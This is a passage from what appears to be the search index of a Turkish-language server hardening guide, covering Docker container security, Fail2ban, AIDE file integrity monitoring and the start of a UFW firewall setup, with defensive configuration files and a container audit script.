db_password:\n    file: ./secrets/db_password.txt\n</code></pre>"},{"location":"security/docker/#7-komple-guvenli-docker-composeyml-ornegi","title":"7. Komple G\u00fcvenli <code>docker-compose.yml</code> \u00d6rne\u011fi \ud83c\udfc6","text":"<p>Bunu kopyala ve projelerinde \u015fablon olarak kullan:</p> <pre><code>version: \"3.8\"\n\nservices:\n  app:\n    image: my-app:latest\n\n    # 1. Non-root user\n    user: \"1001:1001\"\n\n    # 2. Read-only filesystem\n    read_only: true\n    tmpfs:\n      - /tmp:size=100M,mode=1777\n\n    # 3. Resource limits\n    deploy:\n      resources:\n        limits:\n          cpus: \"0.5\"\n          memory: 512M\n    pids_limit: 100\n\n    # 4. Capabilities\n    cap_drop:\n      - ALL\n    cap_add:\n      - NET_BIND_SERVICE\n    security_opt:\n      - no-new-privileges:true\n\n    # 5. Network isolation\n    networks:\n      - frontend\n\n    # 6. Secrets\n    secrets:\n      - api_key\n\n    # 7. Logging limiti (Diski doldurmas\u0131n)\n    logging:\n      driver: \"json-file\"\n      options:\n        max-size: \"10m\"\n        max-file: \"3\"\n\n    # 8. Health check (Zombie container tespiti &amp; Auto-restart)\n    healthcheck:\n      test: [\"CMD\", \"curl\", \"-f\", \"http://localhost:3000/health\"]\n      interval: 30s\n      timeout: 10s\n      retries: 3\n      start_period: 40s\n\nnetworks:\n  frontend:\n    driver: bridge\n\nsecrets:\n  api_key:\n    file: ./secrets/api_key.txt\n</code></pre>"},{"location":"security/docker/#8-guvenlik-kontrol-scripti","title":"8. G\u00fcvenlik Kontrol Scripti \ufffd","text":"<p>Mevcut konteynerlerin ne kadar g\u00fcvenli? Bu script ile tara:</p> <p>Dosya: <code>docker_security_check.sh</code></p> <pre><code>#!/bin/bash\necho \"=== \ud83d\udc33 DOCKER G\u00dcVENL\u0130K KONTROL\u00dc ===\"\n\necho -e \"\\n[1] Root olarak \u00e7al\u0131\u015fan container'lar:\"\nfor c in $(docker ps -q); do\n    USER=$(docker exec $c whoami 2&gt;/dev/null || echo \"N/A\")\n    NAME=$(docker inspect --format '{{.Name}}' $c)\n    if [ \"$USER\" = \"root\" ]; then\n        echo \"  \u26a0\ufe0f  $NAME: ROOT! (D\u00fczeltilmeli)\"\n    else\n        echo \"  \u2705 $NAME: $USER\"\n    fi\ndone\n\necho -e \"\\n[2] Privileged container'lar:\"\ndocker ps -q | xargs docker inspect --format '{{.Name}}: Privileged={{.HostConfig.Privileged}}' | grep \"true\" || echo \"  \u2705 Yok\"\n\necho -e \"\\n[3] Docker socket mount edilmi\u015f:\"\ndocker ps -q | xargs docker inspect --format '{{.Name}}: {{.Mounts}}' | grep \"docker.sock\" || echo \"  \u2705 Yok\"\n\necho -e \"\\n[4] Resource limiti OLMAYAN container'lar:\"\nfor c in $(docker ps -q); do\n    NAME=$(docker inspect --format '{{.Name}}' $c)\n    MEM=$(docker inspect --format '{{.HostConfig.Memory}}' $c)\n    if [ \"$MEM\" = \"0\" ]; then\n        echo \"  \u26a0\ufe0f  $NAME: Limit yok! (Riskli)\"\n    fi\ndone\n\necho -e \"\\n[5] Host network kullananlar:\"\ndocker ps -q | xargs docker inspect --format '{{.Name}}: {{.HostConfig.NetworkMode}}' | grep \"host\" || echo \"  \u2705 Yok\"\n\necho -e \"\\n=== KONTROL TAMAMLANDI ===\"\n</code></pre>"},{"location":"security/docker/#scripti-calstrma","title":"Scripti \u00c7al\u0131\u015ft\u0131rma","text":"<pre><code># Scripti kaydet ve \u00e7al\u0131\u015ft\u0131r\u0131labilir yap\nsudo nano /usr/local/bin/docker_security_check.sh\n# (Yukar\u0131daki i\u00e7eri\u011fi yap\u0131\u015ft\u0131r)\n\nsudo chmod +x /usr/local/bin/docker_security_check.sh\n\n# \u00c7al\u0131\u015ft\u0131r\ndocker_security_check.sh\n</code></pre>"},{"location":"security/docker/#9-image-guvenligi","title":"9. Image G\u00fcvenli\u011fi \ud83d\uddbc\ufe0f","text":"<p>Container'lar\u0131n temeli olan image'lar g\u00fcvenli de\u011filse, \u00fcst\u00fcne ne yaparsan\u0131z yap\u0131n bo\u015ftur.</p>"},{"location":"security/docker/#guvenilir-image-kullan","title":"G\u00fcvenilir Image Kullan","text":"<pre><code># \u274c YANLI\u015e: Random kullan\u0131c\u0131 image'\u0131 (\u0130\u00e7inde ne oldu\u011fu belirsiz)\ndocker pull randomuser/nginx-super\n\n# \u2705 DO\u011eRU: Official veya Verified Publisher\ndocker pull nginx:alpine\ndocker pull bitnami/nginx\n</code></pre>"},{"location":"security/docker/#minimal-base-image-alpine-tercih-et","title":"Minimal Base Image (Alpine Tercih Et)","text":"<pre><code># \u274c B\u00fcy\u00fck image = Daha fazla g\u00fcvenlik a\u00e7\u0131\u011f\u0131, daha yava\u015f\nFROM node:18          # ~900MB, y\u00fczlerce gereksiz paket\n\n# \u2705 Minimal image = K\u00fc\u00e7\u00fck attack surface, h\u0131zl\u0131\nFROM node:18-alpine   # ~100MB, sadece gerekli paketler\n</code></pre>"},{"location":"security/docker/#image-tarama-trivy","title":"Image Tarama (Trivy)","text":"<p>Image'\u0131 production'a almadan \u00f6nce mutlaka taray\u0131n.</p> <pre><code># Kurulum\nsudo apt install trivy -y\n\n# Image tara\ntrivy image nginx:latest\ntrivy image my-app:latest\n\n# CI/CD'de: HIGH/CRITICAL varsa build'i durdur\ntrivy image --exit-code 1 --severity HIGH,CRITICAL my-app:latest\n</code></pre>"},{"location":"security/docker/#10-docker-daemon-hardening","title":"10. Docker Daemon Hardening \ud83d\udd27","text":"<p>Docker servisini (Daemon) g\u00fcvenli hale getirmek i\u00e7in <code>/etc/docker/daemon.json</code> dosyas\u0131n\u0131 yap\u0131land\u0131r\u0131n.</p> <p>Dosya: <code>/etc/docker/daemon.json</code></p> <pre><code>{\n  \"icc\": false,\n  \"userns-remap\": \"default\",\n  \"no-new-privileges\": true,\n  \"live-restore\": true,\n  \"userland-proxy\": false,\n  \"log-driver\": \"json-file\",\n  \"log-opts\": {\n    \"max-size\": \"10m\",\n    \"max-file\": \"3\"\n  }\n}\n</code></pre> <p>Uygula:</p> <pre><code>sudo systemctl restart docker\n</code></pre> Ayar A\u00e7\u0131klama <code>icc: false</code> Container'lar aras\u0131 varsay\u0131lan ileti\u015fimi kapat (Herkes herkesle konu\u015famaz). <code>userns-remap</code> Container root \u2260 Host root (\u0130zolasyon). <code>no-new-privileges</code> Privilege escalation engelle. <code>live-restore</code> Docker restart olunca container'lar \u00f6lmesin. <code>log-driver</code> Loglar\u0131n diski doldurmas\u0131n\u0131 engelle (Log Rotation)."},{"location":"security/docker/#ozet-saldr-vs-onlem","title":"\u00d6zet: Sald\u0131r\u0131 vs \u00d6nlem \ud83d\udee1\ufe0f","text":"Sald\u0131r\u0131 Tipi \u00d6nlem Container Breakout Non-root User, Read-only FS, No-Privileges Crypto Mining Resource Limits (CPU/RAM) DDoS / Scanning Internal Network (\u0130zolasyon) Data Theft Docker Secrets"},{"location":"security/fail2ban/","title":"Fail2ban ile Aktif Koruma","text":"<p>Fail2ban, sunucunuzdaki log dosyalar\u0131n\u0131 s\u00fcrekli okuyan bir \"G\u00fcvenlik Bek\u00e7isi\"dir.</p> <p>[!CAUTION] &gt; \u00c7ak\u0131\u015fma Uyar\u0131s\u0131: E\u011fer sunucunuzda CrowdSec y\u00fckl\u00fc ise Fail2ban kurmay\u0131n! \u0130ki ara\u00e7 ayn\u0131 anda \u00e7al\u0131\u015f\u0131rsa Firewall kurallar\u0131 (iptables/nftables) birbirine girer ve sunucuyu kilitleyebilir. Modern ve daha performansl\u0131 bir alternatif i\u00e7in CrowdSec rehberine bak\u0131n.</p>"},{"location":"security/fail2ban/#sk-sorulan-sorular-once-buray-okuyun","title":"S\u0131k Sorulan Sorular (\u00d6nce Buray\u0131 Okuyun!)","text":""},{"location":"security/fail2ban/#1-sadece-ssh-m-korur","title":"1. Sadece SSH'\u0131 m\u0131 korur?","text":"<p>HAYIR. Fail2ban, log \u00fcreten her \u015feyi koruyabilir.</p> <ul> <li>SSH: Yanl\u0131\u015f \u015fifre deneyenleri banlar.</li> <li>Nginx/Apache: 403/404 hatalar\u0131n\u0131 \u00e7ok alanlar\u0131 veya botlar\u0131 banlar.</li> <li>WordPress: <code>/wp-login.php</code> sayfas\u0131na sald\u0131ranlar\u0131 banlar.</li> </ul>"},{"location":"security/fail2ban/#2-kurdum-ve-active-yazyor-koruyor-mu","title":"2. Kurdum ve \"Active\" yaz\u0131yor, koruyor mu?","text":"<p>HAYIR, hen\u00fcz de\u011fil!</p> <ul> <li>Fail2ban kuruldu\u011funda varsay\u0131lan olarak sadece 22. Portu dinler.</li> <li>Biz SSH portunu 2222 yapt\u0131\u011f\u0131m\u0131z i\u00e7in, \u015fu an Fail2ban \"havaya bak\u0131yor\". Sald\u0131rgan 2222'den girip denerse Fail2ban bunu G\u00d6RMEZ.</li> <li>Bu y\u00fczden konfig\u00fcrasyon yapmam\u0131z \u015eARTTIR.</li> </ul>"},{"location":"security/fail2ban/#1-kurulum-ve-kontrol","title":"1. Kurulum ve Kontrol","text":"<p>\u00d6nce paketi kurun ve servisin durumuna bak\u0131n:</p> <pre><code>sudo apt update\nsudo apt install -y fail2ban\nsudo systemctl status fail2ban --no-pager\n</code></pre> <p>E\u011fer \"active (running)\" de\u011filse servisi ba\u015flat\u0131n:</p> <pre><code>sudo systemctl enable --now fail2ban\n</code></pre> <p>[!TIP] &gt; Neden <code>--no-pager</code>? &gt; <code>systemctl</code> normalde \u00e7\u0131kt\u0131 uzunsa (less) i\u00e7ine girer. <code>--no-pager</code> eklerseniz \u00e7\u0131kt\u0131y\u0131 ekrana basar ve terminale geri d\u00f6ner. Di\u011fer yararl\u0131 parametreler:</p> <ul> <li><code>systemctl status fail2ban -l</code>: Sat\u0131rlar\u0131 kesmeden (truncate) t\u00fcm hatay\u0131 g\u00f6sterir.</li> <li><code>systemctl status fail2ban -n 50</code>: Son 10 sat\u0131r yerine son 50 sat\u0131r\u0131 g\u00f6sterir.</li> </ul>"},{"location":"security/fail2ban/#2-konfigurasyon-mantg-nasl-ayarlayacagz","title":"2. Konfig\u00fcrasyon Mant\u0131\u011f\u0131 (Nas\u0131l Ayarlayaca\u011f\u0131z?)","text":"<p>Fail2ban'in ayar dosyas\u0131n\u0131 (<code>jail.conf</code>) ASLA de\u011fi\u015ftirmeyin. \u00c7\u00fcnk\u00fc g\u00fcncelleme gelince dosya s\u0131f\u0131rlan\u0131r, ayarlar\u0131n\u0131z gider.</p> <p>Bunun yerine \"Par\u00e7al\u0131 Y\u00f6netim\" (Modular) yap\u0131s\u0131n\u0131 kullanaca\u011f\u0131z.</p>"},{"location":"security/fail2ban/#neden-jaild-kullanyoruz","title":"Neden <code>jail.d</code> kullan\u0131yoruz?","text":"<p>T\u00fcm ayarlar\u0131 tek bir devasa dosyaya (<code>jail.local</code>) yazmak eski bir y\u00f6ntemdir. Y\u00f6netmesi zordur. Biz <code>/etc/fail2ban/jail.d/</code> klas\u00f6r\u00fc alt\u0131na her servis i\u00e7in ayr\u0131 bir dosya koyaca\u011f\u0131z.</p> <ul> <li><code>sshd.local</code>: Sadece SSH ayarlar\u0131.</li> <li><code>nginx.local</code>: Sadece Nginx ayarlar\u0131.</li> <li><code>whitelist.local</code>: Sadece g\u00fcvenli IP listesi.</li> </ul> <p>Bu sayede bir \u015feyi kapatmak isterseniz, o dosyay\u0131 silmeniz yeterlidir.</p>"},{"location":"security/fail2ban/#gelecek-icin-ornekler-future-proof","title":"Gelecek i\u00e7in \u00d6rnekler (Future Proof)","text":"<p><code>/etc/fail2ban/jail.d/</code> alt\u0131na \u015fu dosyalar\u0131 olu\u015fturabilirsiniz:</p> <p>1. Nginx Proxy Manager (<code>jail.d/npm.local</code>):</p> <pre><code>[npm-proxy]\nenabled = true\nport = 80,443\nfilter = nginx-proxy-manager\nlogpath = /data/logs/proxy-host-*.log\nmaxretry = 3\n</code></pre> <p>2. PostgreSQL (<code>jail.d/postgresql.local</code>):</p> <pre><code>[postgresql]\nenabled = true\nport = 5432\nfilter = postgresql\nlogpath = /var/log/postgresql/postgresql-*-main.log\nmaxretry = 5\n</code></pre> <p>3. MySQL (<code>jail.d/mysql.local</code>):</p> <pre><code>[mysqld-auth]\nenabled = true\nport = 3306\nlogpath = /var/log/mysql/error.log\nmaxretry = 5\n</code></pre> <p>Her servis i\u00e7in ayr\u0131 dosya a\u00e7mak, y\u00f6netimi \u00e7ocuk oyunca\u011f\u0131 yapar.</p>"},{"location":"security/fail2ban/#3-ssh-korumas-jail-olusturma","title":"3. SSH Korumas\u0131 (Jail Olu\u015fturma)","text":"<p>Hadi ilk par\u00e7am\u0131z\u0131 (mod\u00fcl\u00fcm\u00fcz\u00fc) olu\u015ftural\u0131m. SSH servisini koruyacak ayarlar\u0131 yap\u0131yoruz. Dosya yoksa olu\u015facakt\u0131r, korkmay\u0131n.</p> <pre><code>sudo nano /etc/fail2ban/jail.d/sshd.local\n</code></pre> <p>Dosyan\u0131n i\u00e7ine a\u015fa\u011f\u0131daki ayarlar\u0131 yap\u0131\u015ft\u0131r\u0131n. Port k\u0131sm\u0131n\u0131n sizin kulland\u0131\u011f\u0131n\u0131z portla (2222) ayn\u0131 oldu\u011fundan emin olun.</p> <pre><code>```ini\n[sshd]\nenabled = true\nbackend = systemd\nport = 2222\nmaxretry = 5\nfindtime = 10m\nbantime = 1h\n# Public Key hatalar\u0131n\u0131 yakalamak i\u00e7in agresif mod \u015fartt\u0131r:\nmode = aggressive\n</code></pre>"},{"location":"security/fail2ban/#4-ileri-duzey-kavramlar-filtreler-ve-eylemler","title":"4. \u0130leri D\u00fczey Kavramlar (Filtreler ve Eylemler)","text":"<p>Fail2ban'in nas\u0131l \u00e7al\u0131\u015ft\u0131\u011f\u0131n\u0131 anlamak i\u00e7in iki kavram\u0131 bilmek gerekir:</p>"},{"location":"security/fail2ban/#filtreler-filters","title":"Filtreler (Filters)","text":"<p>Log dosyas\u0131nda \"neyin sald\u0131r\u0131 oldu\u011funu\" anlayan Regex kurallar\u0131d\u0131r. <code>/etc/fail2ban/filter.d/</code> alt\u0131nda dururlar. \u00d6rn: <code>sshd.conf</code> i\u00e7inde \"Failed password\" yaz\u0131s\u0131n\u0131 arayan kurallar vard\u0131r. Genelde bunlara dokunman\u0131z gerekmez.</p>"},{"location":"security/fail2ban/#eylemler-actions","title":"Eylemler (Actions)","text":"<p>Bir IP banlan\u0131nca ne olacak?</p> <ul> <li>action_: Sadece Firewall (iptables/ufw) kural\u0131 ekler (Varsay\u0131lan).</li> <li>action_mw: Banlar ve <code>destemail</code> adresine mail atar.</li> <li>action_mwl: Banlar, mail atar ve mailin i\u00e7ine loglar\u0131 da ekler.</li> </ul> <p>[!NOTE] Mail almak isterseniz sunucuda <code>sendmail</code> veya <code>postfix</code> kurulu olmal\u0131d\u0131r. G\u00fcn\u00fcm\u00fczde sunucudan mail atmak zor oldu\u011fu i\u00e7in (SPAM riski), genelde Slack/Discord webhook'lar\u0131 tercih edilir.</p>"},{"location":"security/fail2ban/#5-whitelist-kendini-banlamamak","title":"5. Whitelist (Kendini Banlamamak)","text":"<p>E\u011fer sabit bir IP adresiniz varsa, kendinizi g\u00fcvenli listeye ekleyebilirsiniz.</p> <pre><code>sudo nano /etc/fail2ban/jail.d/whitelist.local\n</code></pre> <p>En \u00fcste IP adresinizi ekleyin (birden fazla IP varsa bo\u015flukla ay\u0131r\u0131n):</p> <pre><code>[DEFAULT]\nignoreip = 127.0.0.1/8 192.168.1.50/32\n</code></pre>"},{"location":"security/fail2ban/#6-aktiflestirme-ve-kontrol","title":"6. Aktifle\u015ftirme ve Kontrol","text":"<p>Ayarlar\u0131 ge\u00e7erli k\u0131lmak i\u00e7in servisi yeniden ba\u015flat\u0131n:</p> <pre><code># Konfig\u00fcrasyonda hata var m\u0131 kontrol et\nsudo fail2ban-client -t\n\n# Servisi yeniden ba\u015flat\nsudo systemctl restart fail2ban\n</code></pre>"},{"location":"security/fail2ban/#durum-sorgulama","title":"Durum Sorgulama","text":"<pre><code># Genel durum (Hangi hapishaneler aktif?)\nsudo fail2ban-client status\n# \u00c7\u0131kt\u0131: Jail list: sshd\n\n# SSH Jail detaylar\u0131 (Kimler banlanm\u0131\u015f?)\nsudo fail2ban-client status sshd\n</code></pre>"},{"location":"security/fail2ban/#derinlemesine-kontrol-firewall-seviyesi","title":"Derinlemesine Kontrol (Firewall Seviyesi)","text":"<p>Fail2ban ger\u00e7ekten i\u015f yap\u0131yor mu? Bunu firewall kurallar\u0131na bakarak g\u00f6rebilirsiniz. <code>iptables</code> komutu, UFW kullansan\u0131z bile arka plandaki kurallar\u0131 g\u00f6sterir:</p> <pre><code>sudo iptables -S | grep f2b\n</code></pre> <p>\u00c7\u0131kt\u0131da \u015funa benzer sat\u0131rlar g\u00f6rmelisiniz:</p> <pre><code>-N f2b-sshd\n-A INPUT -p tcp -m multiport --dports 2222 -j f2b-sshd\n-A f2b-sshd -s 1.2.3.4/32 -j REJECT --reject-with icmp-port-unreachable\n</code></pre> <p>(Son sat\u0131rdaki <code>1.2.3.4</code> banlanm\u0131\u015f bir sald\u0131rgand\u0131r).</p>"},{"location":"security/fail2ban/#7-test-etme-ban-testi","title":"7. Test Etme (Ban Testi)","text":"<p>Ayarlar\u0131n\u0131z\u0131n \u00e7al\u0131\u015f\u0131p \u00e7al\u0131\u015fmad\u0131\u011f\u0131n\u0131 test etmek i\u00e7in en g\u00fcvenli y\u00f6ntem \u015fudur:</p> <ol> <li>Farkl\u0131 Bir Ba\u011flant\u0131 Bulun: Telefonunuzun mobil internetini (Hotspot) kullan\u0131n.</li> <li>Hatal\u0131 Giri\u015f Yap\u0131n: Mobil internet \u00fczerinden terminal a\u00e7\u0131n (Termius vb.) ve sunucunuza yanl\u0131\u015f \u015fifre ile ba\u011flanmay\u0131 deneyin.     <pre><code>ssh kullan\u0131c\u0131@sunucu-ip -p 2222\n</code></pre></li> <li>Tekrarlay\u0131n: 5-6 kez h\u0131zl\u0131ca yanl\u0131\u015f \u015fifre girin.</li> <li>Banlanma: Bir s\u00fcre sonra cevap gelmemeye ba\u015flayacak veya \"Connection Refused\" alacaks\u0131n\u0131z.</li> <li> <p>Ban Kald\u0131rma (Unban):     \u015eimdi \u00e7al\u0131\u015fan (Wi-Fi) ba\u011flant\u0131n\u0131zdan sunucuya d\u00f6n\u00fcn ve o banlanan (mobil) IP'yi affedin:</p> <pre><code>sudo fail2ban-client set sshd unbanip &lt;MOBIL_IP_ADRESINIZ&gt;\n</code></pre> </li> </ol>"},{"location":"security/fail2ban/#8-sorun-giderme-troubleshooting","title":"8. Sorun Giderme (Troubleshooting)","text":"<p>\u0130\u015fler ters gitti\u011finde kontrol etmeniz gerekenler:</p>"},{"location":"security/fail2ban/#hata-failed-to-access-socket","title":"Hata: \"Failed to access socket\"","text":"<p>Komutu yazd\u0131n\u0131z ve \u015fu hatay\u0131 ald\u0131n\u0131z:</p> <pre><code>ERROR Failed to access socket path: /var/run/fail2ban/fail2ban.sock. Is fail2ban running?\n</code></pre> <p>Anlam\u0131: Fail2ban servisi \u00e7\u00f6km\u00fc\u015f (Running de\u011fil). \u00c7\u00f6z\u00fcm\u00fc:</p> <ol> <li>Servisi ba\u015flatmay\u0131 deneyin: <code>sudo systemctl restart fail2ban</code></li> <li>E\u011fer ba\u015flam\u0131yorsa, konfig\u00fcrasyon dosyan\u0131zda yaz\u0131m hatas\u0131 vard\u0131r.</li> <li>Hatay\u0131 bulmak i\u00e7in: <code>sudo fail2ban-client -t</code></li> <li>Veya detayl\u0131 log i\u00e7in: <code>journalctl -u fail2ban.service -e</code></li> </ol>"},{"location":"security/fail2ban/#uyar-wrong-value-for-maxretry","title":"Uyar\u0131: \"Wrong value for 'maxretry'\"","text":"<p><code>fail2ban-client -t</code> yapt\u0131ysan\u0131z ve bu uyar\u0131y\u0131 g\u00f6r\u00fcyorsan\u0131z, dosyada bir \u015feyi yanl\u0131\u015f yazd\u0131n\u0131z.</p> <ul> <li>Yanl\u0131\u015f: Dosyan\u0131n en ba\u015f\u0131na <code>[sshd]</code> etiketi koymay\u0131 unutmu\u015f olabilirsiniz.</li> <li>Yanl\u0131\u015f: Sat\u0131rba\u015flar\u0131nda gereksiz bo\u015fluk b\u0131rakm\u0131\u015f olabilirsiniz.</li> <li>Do\u011fru: Her blok mutlaka <code>[k\u00f6\u015feli parantez]</code> ile ba\u015flamal\u0131d\u0131r.</li> </ul>"},{"location":"security/fail2ban/#hata-dosya-yanls-yerde","title":"Hata: Dosya Yanl\u0131\u015f Yerde","text":"<p>Dosyalar mutlaka <code>/etc/fail2ban/jail.d/</code> klas\u00f6r\u00fcnde olmal\u0131d\u0131r. E\u011fer yanl\u0131\u015fl\u0131kla <code>/etc/fail2ban/sshd.local</code> (bir \u00fcst klas\u00f6r) olu\u015fturduysan\u0131z silin:</p> <pre><code>sudo rm /etc/fail2ban/sshd.local\n</code></pre>"},{"location":"security/fail2ban/#sorun-test-ediyorum-banlamyor","title":"Sorun: \"Test Ediyorum Banlam\u0131yor\"","text":"<p>Terminalden \"Permission denied (publickey)\" hatas\u0131 al\u0131yorsunuz ama Fail2ban saym\u0131yor mu? Sebep: Fail2ban varsay\u0131lan olarak \"Wrong Password\" hatalar\u0131na bakar. Public Key hatalar\u0131 daha sessizdir. \u00c7\u00f6z\u00fcm: Konfig\u00fcrasyon dosyan\u0131za (<code>sshd.local</code>) \u015fu sat\u0131r\u0131 ekleyin:</p> <pre><code>mode = aggressive\n</code></pre>"},{"location":"security/fail2ban/#sorun-iptables-listesinde-goremiyorum","title":"Sorun: \"iptables Listesinde G\u00f6remiyorum\"","text":"<p>E\u011fer <code>iptables -S</code> bo\u015f d\u00f6n\u00fcyorsa, sunucunuz <code>nftables</code> kullan\u0131yor olabilir. \u015eunu deneyin:</p> <pre><code>sudo nft list ruleset | grep -i fail2ban\n</code></pre>"},{"location":"security/fim/","title":"Dosya B\u00fct\u00fcnl\u00fck Takibi (AIDE) \ud83d\udd75\ufe0f\u200d\u2642\ufe0f","text":"<p>Bir sald\u0131rgan sunucuya s\u0131zd\u0131\u011f\u0131nda genellikle <code>sshd_config</code>, <code>passwd</code> veya <code>crontab</code> gibi kritik dosyalar\u0131 de\u011fi\u015ftirir. AIDE (Advanced Intrusion Detection Environment), sistemdeki dosyalar\u0131n \"parmak izini\" (Hash) al\u0131r ve herhangi bir de\u011fi\u015fiklik oldu\u011funda sizi uyar\u0131r.</p> <p>Mant\u0131k: \u0130lk g\u00fcn bir \"Foto\u011fraf\" (Snapshot) \u00e7ekersiniz. Her gece yeni foto\u011frafla eskisini kar\u015f\u0131la\u015ft\u0131r\u0131rs\u0131n\u0131z. Fark varsa, biri dosyay\u0131 de\u011fi\u015ftirmi\u015f demektir.</p>"},{"location":"security/fim/#1-kurulum","title":"1. Kurulum","text":"<pre><code>sudo apt update\nsudo apt install aide -y\n</code></pre>"},{"location":"security/fim/#2-ilk-veritabann-olusturma","title":"2. \u0130lk Veritaban\u0131n\u0131 Olu\u015fturma","text":"<p>Kurulumdan sonra AIDE'nin sistemin \"temiz\" halini \u00f6\u011frenmesi gerekir. Bu i\u015flem sistemdeki dosya say\u0131s\u0131na g\u00f6re 1-2 dakika s\u00fcrebilir.</p> <pre><code># Veritaban\u0131n\u0131 olu\u015ftur (Bu i\u015flem biraz s\u00fcrer)\nsudo aideinit\n\n# Olu\u015fan veritaban\u0131n\u0131 aktif hale getir\nsudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n</code></pre>"},{"location":"security/fim/#3-yaplandrma-gurultuyu-azaltma","title":"3. Yap\u0131land\u0131rma (G\u00fcr\u00fclt\u00fcy\u00fc Azaltma)","text":"<p>AIDE varsay\u0131lan olarak \u00e7ok hassast\u0131r. Log dosyalar\u0131 geli\u015ftik\u00e7e \"Dosya de\u011fi\u015fti!\" diye uyar\u0131 verir. Bunu engellemek i\u00e7in ayarlar\u0131 d\u00fczenleyelim.</p> <p>Dosya: <code>/etc/aide/aide.conf</code></p> <pre><code>sudo nano /etc/aide/aide.conf\n</code></pre> <p>A\u015fa\u011f\u0131daki gibi bir filtreleme mant\u0131\u011f\u0131 kullanabilirsiniz (Dosyan\u0131n sonuna ekleyin veya mevcut kurallar\u0131 d\u00fczenleyin):</p> <pre><code># Log dosyalar\u0131n\u0131n sadece \"b\u00fcy\u00fcmesini\" g\u00f6z ard\u0131 et (\u0130\u00e7erik de\u011fi\u015febilir ama silinemez)\n/var/log/   FreqRot\n/var/mail/  FreqRot\n\n# Ge\u00e7ici dizinleri yoksay\n!/tmp/\n!/var/run/\n!/var/tmp/\n</code></pre> <p>Not: <code>FreqRot</code> (Frequent Rotation), log dosyalar\u0131 i\u00e7in \u00f6zel bir moddur. Dosyan\u0131n de\u011fi\u015fmesini normal kar\u015f\u0131lar.</p>"},{"location":"security/fim/#4-manuel-kontrol","title":"4. Manuel Kontrol","text":"<p>\u0130stedi\u011finiz zaman sistemde de\u011fi\u015fiklik var m\u0131 diye kontrol etmek i\u00e7in:</p> <pre><code>sudo aide --check\n</code></pre> <ul> <li>\u00c7\u0131kt\u0131 Bo\u015fsa: De\u011fi\u015fiklik yok (Temiz).</li> <li>\u00c7\u0131kt\u0131 Varsa: De\u011fi\u015fen dosyalar\u0131n listesini verir.</li> </ul>"},{"location":"security/fim/#5-degisiklikleri-onaylama-update","title":"5. De\u011fi\u015fiklikleri Onaylama (Update)","text":"<p>Sistemi g\u00fcncellediniz (<code>apt upgrade</code>) veya konfig\u00fcrasyon de\u011fi\u015ftirdiniz. AIDE \"Dosyalar de\u011fi\u015fti!\" diye ba\u011f\u0131racakt\u0131r. Bunlar\u0131n \"yetkili de\u011fi\u015fiklik\" oldu\u011funu s\u00f6ylemek i\u00e7in veritaban\u0131n\u0131 g\u00fcncellemelisiniz:</p> <pre><code># Yeni durumu 'Normal' kabul et\nsudo aide --update\n\n# Yeni veritaban\u0131n\u0131 aktif et\nsudo mv /var/lib/aide/aide.db.new /var/lib/aide/aide.db\n</code></pre>"},{"location":"security/fim/#6-otomasyon-cron","title":"6. Otomasyon (Cron)","text":"<p>AIDE zaten <code>/etc/cron.daily/aide</code> alt\u0131na kendi scriptini koyar ve her sabah mail atar. Ancak mail sunucunuz yoksa log dosyas\u0131na yazmas\u0131n\u0131 sa\u011flayabilirsiniz.</p> <p>E\u011fer otomatik \u00e7al\u0131\u015fm\u0131yorsa basit bir cron ekleyelim:</p> <pre><code># Her gece 04:00'te kontrol et ve loga yaz\n0 4 * * * /usr/bin/aide --check &gt; /var/log/aide-check.log 2&gt;&amp;1\n</code></pre>"},{"location":"security/fim/#onemli-uyar","title":"\u26a0\ufe0f \u00d6nemli Uyar\u0131","text":"<p>AIDE, canl\u0131 sald\u0131r\u0131y\u0131 engellemez. Sadece sald\u0131r\u0131 olduktan sonra neyin de\u011fi\u015fti\u011fini size s\u00f6yler. Bu y\u00fczden AIDE veritaban\u0131n\u0131 (<code>/var/lib/aide/aide.db</code>) g\u00fcvenli bir yere (\u00f6rn: mail adresinize veya ba\u015fka sunucuya) yedeklemeniz \u00f6nerilir. Yoksa sald\u0131rgan veritaban\u0131n\u0131 da de\u011fi\u015ftirip kendini gizleyebilir!</p>"},{"location":"security/firewall/","title":"Firewall (UFW) Y\u00f6netimi \ud83d\udee1\ufe0f","text":"<p>Linux sunucunuzun g\u00fcvenli\u011fi i\u00e7in ilk savunma hatt\u0131 g\u00fcvenlik duvar\u0131d\u0131r (Firewall). Biz kullan\u0131m\u0131 kolay ve g\u00fc\u00e7l\u00fc olan UFW (Uncomplicated Firewall) arac\u0131n\u0131 kullan\u0131yoruz.</p> <p>[!IMPORTANT] &gt; Alt\u0131n Kural: \"Her \u015feyi kapat, sadece ihtiyac\u0131 a\u00e7.\" (Default Deny)</p>"},{"location":"security/firewall/#1-kurulum-ve-hazrlk","title":"1. Kurulum ve Haz\u0131rl\u0131k","text":"<p>\u00d6nce UFW paketinin kurulu oldu\u011fundan emin olal\u0131m (Genelde <code>ufw</code> komutu bulunamad\u0131 hatas\u0131 al\u0131yorsan\u0131z):</p> <pre><code>sudo apt update\nsudo apt install ufw -y\n</code></pre> <p>Ard\u0131ndan temiz bir ba\u015flang\u0131\u00e7 yapal\u0131m. E\u011fer daha \u00f6nce kurallar eklendiyse silelim.</p> <pre><code># Servisi durdur (G\u00fcvenlik \u00d6nlemi)\n# Ayarlar\u0131 yaparken ba\u011flant\u0131m\u0131z kopmas\u0131n diye \u00f6nce firewall'u kapat\u0131yoruz.\nsudo ufw disable\n\n# T\u00fcm kurallar\u0131 sil (Temiz Ba\u015flang\u0131\u00e7)\nsudo ufw reset\n</code></pre> <p>[!NOTE] &gt; Neden S\u0131f\u0131rl\u0131yoruz? Kar\u0131\u015f\u0131k veya hatal\u0131 eski kurallar kalmas\u0131n diye. \u015eu an Firewall KAPALI, yani konfig\u00fcrasyon yaparken ba\u011flant\u0131n\u0131z kesilmez. Rahat olun. \u2615</p>"},{"location":"security/firewall/#ipv6-kontrolu","title":"IPv6 Kontrol\u00fc","text":"<p>Sunucunuzda IPv6 aktifse UFW'nin bunu destekledi\u011finden emin olun. <code>sudo nano /etc/default/ufw</code> dosyas\u0131n\u0131 a\u00e7\u0131n ve \u015fu sat\u0131r\u0131 kontrol edin:</p> <pre><code>IPV6=yes\n</code></pre>"},{"location":"security/firewall/#2-varsaylan-politikalar-temel-yasaklar","title":"2. Varsay\u0131lan Politikalar (Temel Yasaklar)","text":"<p>G\u00fcvenlik duvar\u0131n\u0131n mant\u0131\u011f\u0131 \u015fudur: \"Aksi belirtilmedik\u00e7e her \u015feyi yasakla.\"</p> <pre><code># D\u0131\u015far\u0131dan gelen her 